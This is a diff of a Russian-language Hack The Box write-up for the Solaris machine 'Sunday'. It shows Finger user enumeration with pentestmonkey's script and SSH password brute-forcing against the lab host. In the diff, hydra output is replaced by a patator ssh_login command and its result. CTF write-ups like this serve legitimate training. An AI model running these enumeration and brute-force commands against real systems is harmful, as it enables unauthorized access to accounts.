@@ -4,11 +4,11 @@ title: "HTB: Sunday Write-Up"
 date: 2018-10-09 22:00:00 +0300
 author: snovvcrash
 categories: ctf write-ups boxes hackthebox
-tags: [ctf, write-ups, boxes, hackthebox, Sunday, solaris, finger, brute-force, hydra, shadow, john, wget, sudoers]
+tags: [ctf, write-ups, boxes, hackthebox, Sunday, solaris, finger, brute-force, patator, shadow, john, wget, sudoers]
 comments: true
 ---
 
-**Sunday** — простая машина на основе ОС Solaris. В ассортименте: древний net-протокол *Finger* для получения информации о залогиненных пользователях в качестве входной точки, брутфорс SSH-кредов, восстановление пароля соседнего пользователя по хешу (просим помощи у *Джона*) для первого PrivEsc'а и целая уйма способов получения рут-сессии через эксплуатацию *wget* для второго PrivEsc'а (попробуем все). Несмотря на то, что это правда одна из самых нетрудных тачек на HTB, большинство людей выбирали модификацию *shadow* / *sudoers* -файлов в качестве финального повышения привилегий, откуда непрекращающиеся сбои, ресеты и туча головной боли для вежливых хакеров. Рассмотрим же вместе этот временами бесящий, но от этого не менее веселый путь к победе над Sunday.
+**Sunday** — простая машина на основе ОС Solaris. В ассортименте: древний net-протокол *Finger* для получения информации о залогиненных пользователях в качестве входной точки, брутфорс SSH-кредов, восстановление пароля соседнего пользователя по хешу (просим помощи у *Джона*) для первого PrivEsc'а и целая уйма способов получения рут-сессии через эксплуатацию *wget* для второго PrivEsc'а (попробуем все). Несмотря на то, что это правда одна из самых нетрудных тачек на HTB, большинство людей выбирали модификацию *shadow* / *sudoers* -файлов в качестве финального повышения привилегий, откуда непрекращающиеся сбои, ресеты и туча головной боли для вежливых хакеров. Рассмотрим же вместе этот временами бесящий, но от этого не менее веселый путь к победе над Sunday. **Сложность: 4.1/10**{:style="color:grey;"}
 
 <!--cut-->
 
@@ -97,9 +97,9 @@ Login       Name               TTY         Idle    When    Where
 Злых хакеров нет, поэтому и инфы о них нет. Загрубосилим Finger.
 
 ## Брутфорс Finger
-Можно юзать модуль для Metasploit'а (`auxiliary/scanner/finger/finger_users`), а можно запустить [скрипт](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum "finger-user-enum / pentestmonkey") на Perl'е от pentestmonkey — результат будет один.
+Можно юзать модуль для Metasploit'а (`auxiliary/scanner/finger/finger_users`), а можно запустить [скрипт](https://github.com/pentestmonkey/finger-user-enum/blob/master/finger-user-enum.pl "finger-user-enum/finger-user-enum.pl at master · pentestmonkey/finger-user-enum") на Perl'е от pentestmonkey — результат будет один.
 
-Воспользуемся вторым вариантом со словарем от [SecList](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt")'ов:
+Воспользуемся вторым вариантом со словарем от [SecList](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt "SecLists/names.txt at master · danielmiessler/SecLists")'ов:
 ```text
 root@kali:~# wget http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
 root@kali:~# tar -xvf finger-user-enum-1.0.tar.gz
@@ -122,7 +122,7 @@ Relay Server ............. Not used
 
 ######## Scan started at Sun Oct  7 08:57:50 2018 #########
 access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
-admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..uucp     uucp Admin                         < .  .  .  . >..nuucp    uucp Admin                         < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..listen   Network Admin                      < .  .  .  . >..
+admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..uucp
 anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
 bin@10.10.10.76: bin             ???                         < .  .  .  . >..
 dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
@@ -138,7 +138,7 @@ zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    
 ######## Scan completed at Sun Oct  7 09:03:50 2018 #########
 14 results.
 
-10163 queries in 360 seconds (28.2 queries / sec)
+10163 queries in 394 seconds (25.8 queries / sec)
 ```
 
 Среди кучи мусора видим 2 нужные строки:
@@ -165,7 +165,7 @@ sunny    sunny                 pts/3        <Apr 24 10:48> 10.10.14.4
 
 Начнем с *sunny*, т. к. имя коррелирует с названием машины. Есть такая практика на HTB — там, где нужно угадать пароль, ставить в качестве пароля название машины, либо что-то с ним созвучное. Поэтому мы могли бы просто попробовать приконнектиться с паролем `sunday` (и эта попытка увенчалась бы успехом с вероятностью 99 %), но какой же тогда интерес?
 
-Набросаем список вероятных парольных фраз для гидры и забрутим SSH:
+Набросаем список вероятных парольных фраз для пататора и забрутим SSH:
 ```text
 root@kali:~# cat sunny_pass.lst
 sammy
@@ -184,29 +184,13 @@ sunday
 ```
 
 ```text
-root@kali:~# hydra -V -t 4 -f -I -l sunny -P sunny_pass.lst 10.10.10.76 ssh -s 22022
-Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-
-Hydra (http://www.thc.org/thc-hydra) starting at 2018-10-07 10:12:09
-[DATA] max 4 tasks per 1 server, overall 4 tasks, 13 login tries (l:1/p:13), ~4 tries per task
-[DATA] attacking ssh://10.10.10.76:22022/
-[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "sammy" - 1 of 13 [child 0] (0/0)
-[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "sunny" - 2 of 13 [child 1] (0/0)
-[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "Sun" - 3 of 13 [child 2] (0/0)
-[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "sun" - 4 of 13 [child 3] (0/0)
-[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "Solaris" - 5 of 13 [child 0] (0/1)
-[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "solaris" - 6 of 13 [child 3] (0/1)
-[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "SunSSH" - 7 of 13 [child 2] (0/2)
-[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "sunssh" - 8 of 13 [child 1] (0/3)
-[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "HTB" - 9 of 13 [child 3] (0/3)
-[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "htb" - 10 of 13 [child 0] (0/4)
-[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "hackthebox" - 11 of 13 [child 2] (0/4)
-[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "Sunday" - 12 of 13 [child 3] (0/4)
-[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "sunday" - 13 of 13 [child 1] (0/6)
-[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
-[STATUS] attack finished for 10.10.10.76 (valid pair found)
-1 of 1 target successfully completed, 1 valid password found
-Hydra (http://www.thc.org/thc-hydra) finished at 2018-10-07 10:12:13
+root@kali:~# patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=./sunny_pass.lst -x ignore:mesg='Authentication failed.'
+13:23:14 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-10-10 13:23 EDT
+13:23:14 patator    INFO -
+13:23:14 patator    INFO - code  size    time | candidate                          |   num | mesg
+13:23:14 patator    INFO - -----------------------------------------------------------------------------
+13:23:16 patator    INFO - 0     19     0.104 | sunday                             |    13 | SSH-2.0-Sun_SSH_1.3
+13:23:17 patator    INFO - Hits/Done/Skip/Fail/Size: 1/13/0/0/13, Avg: 4 r/s, Time: 0h 0m 3s
 ```
 
 Теперь с чистой совестью логинемся с `sunny:sunday` и сразу в бой:
